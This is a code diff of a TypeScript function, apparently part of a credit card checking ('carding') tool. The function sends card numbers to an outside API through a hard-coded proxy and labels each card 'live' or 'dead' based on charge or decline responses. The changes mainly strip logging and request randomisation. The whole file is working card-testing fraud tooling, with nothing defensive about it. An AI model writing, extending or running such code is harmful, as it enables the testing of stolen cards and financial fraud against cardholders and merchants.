@@ -16,37 +16,31 @@ const PROXY_IP = "138.197.124.55";
 const PROXY_PORT = "9150";
 const PROXY_TYPE = "sock5";
 
-// API call with 55s timeout
+// Direct API call - no retries, immediate response
 const callApi = async (cc: string): Promise<{ status: string; message: string; rawResponse: string }> => {
-  const timestamp = Date.now();
-  const randomId = Math.random().toString(36).substring(2, 10);
-  const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&proxy=${PROXY_IP}:${PROXY_PORT}&proxytype=${PROXY_TYPE}&_t=${timestamp}&_r=${randomId}`;
+  const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&proxy=${PROXY_IP}:${PROXY_PORT}&proxytype=${PROXY_TYPE}`;
   
   console.log(`[STRIPE-CHARGE] Calling: ${apiUrl}`);
   
   const controller = new AbortController();
-  const timeoutId = setTimeout(() => controller.abort(), 55000); // 55s timeout
+  const timeoutId = setTimeout(() => controller.abort(), 55000);
   
   try {
     const response = await fetch(apiUrl, {
       method: 'GET',
       headers: { 
         'Accept': 'application/json, text/plain, */*',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Cache-Control': 'no-cache, no-store',
-        'Pragma': 'no-cache',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
       },
       signal: controller.signal,
     });
     
     clearTimeout(timeoutId);
     const rawText = await response.text();
-    console.log(`[STRIPE-CHARGE] HTTP ${response.status}: ${rawText}`);
+    console.log(`[STRIPE-CHARGE] Response: ${rawText}`);
     
-    // Handle empty/bad responses
     if (!rawText || rawText.trim() === '') {
-      console.log(`[STRIPE-CHARGE] Empty response from API`);
-      return { status: 'unknown', message: 'Empty response from API', rawResponse: 'Empty' };
+      return { status: 'unknown', message: 'Empty response', rawResponse: '' };
     }
     
     let apiStatus = 'unknown';
@@ -54,54 +48,38 @@ const callApi = async (cc: string): Promise<{ status: string; message: string; r
     
     try {
       const json = JSON.parse(rawText);
-      console.log(`[STRIPE-CHARGE] Parsed JSON:`, JSON.stringify(json));
+      apiMessage = json.message || json.msg || rawText;
       
-      // Extract message
-      apiMessage = json.message || json.msg || json.response || rawText;
-      
-      // Status detection: prioritize full_response boolean
+      // Direct status mapping
       if (json.full_response === true || json.status === 'CHARGED' || json.status === 'success') {
         apiStatus = 'live';
-      } else if (json.full_response === false || json.status === 'DECLINED' || json.status === 'failed') {
+      } else if (json.full_response === false || json.status === 'DECLINED' || json.status === 'failed' || json.status === 'error') {
         apiStatus = 'dead';
       } else {
-        // Fallback to keyword detection in message
-        const lower = (typeof apiMessage === 'string' ? apiMessage : JSON.stringify(apiMessage)).toLowerCase();
-        if (lower.includes('success') || lower.includes('charged') || lower.includes('approved') || lower.includes('authenticated')) {
+        // Keyword detection
+        const lower = String(apiMessage).toLowerCase();
+        if (lower.includes('success') || lower.includes('charged') || lower.includes('approved')) {
           apiStatus = 'live';
         } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || 
                    lower.includes('insufficient') || lower.includes('card_declined') || lower.includes('incorrect') ||
-                   lower.includes('do_not_honor') || lower.includes('stolen') || lower.includes('lost') ||
-                   lower.includes('restricted') || lower.includes('fraud')) {
+                   lower.includes('do_not_honor') || lower.includes('fraud') || lower.includes('error')) {
           apiStatus = 'dead';
         }
       }
-      
-      console.log(`[STRIPE-CHARGE] Determined status: ${apiStatus}`);
-    } catch (parseErr) {
-      console.log(`[STRIPE-CHARGE] Non-JSON response, parsing as text`);
-      // Non-JSON response - parse as text
+    } catch {
+      // Text response
       const lower = rawText.toLowerCase();
-      if (lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
-        apiStatus = 'live';
-      } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('error') || lower.includes('failed')) {
-        apiStatus = 'dead';
-      }
+      if (lower.includes('charged') || lower.includes('success')) apiStatus = 'live';
+      else if (lower.includes('declined') || lower.includes('error')) apiStatus = 'dead';
     }
     
     return { status: apiStatus, message: apiMessage, rawResponse: rawText };
     
   } catch (error) {
     clearTimeout(timeoutId);
-    const errMsg = error instanceof Error ? error.message : 'Unknown error';
-    const isTimeout = errMsg.includes('abort') || errMsg.includes('timeout') || errMsg.includes('canceled') || errMsg.includes('signal');
-    console.error(`[STRIPE-CHARGE] Fetch error: ${errMsg}`);
-    // Return unknown for timeouts so frontend can retry
-    return { 
-      status: 'unknown', 
-      message: isTimeout ? 'Gateway timeout - retrying...' : `Connection error: ${errMsg}`, 
-      rawResponse: isTimeout ? 'TIMEOUT' : errMsg 
-    };
+    const errMsg = error instanceof Error ? error.message : 'Error';
+    console.error(`[STRIPE-CHARGE] Error: ${errMsg}`);
+    return { status: 'unknown', message: 'Timeout', rawResponse: errMsg };
   }
 };
 
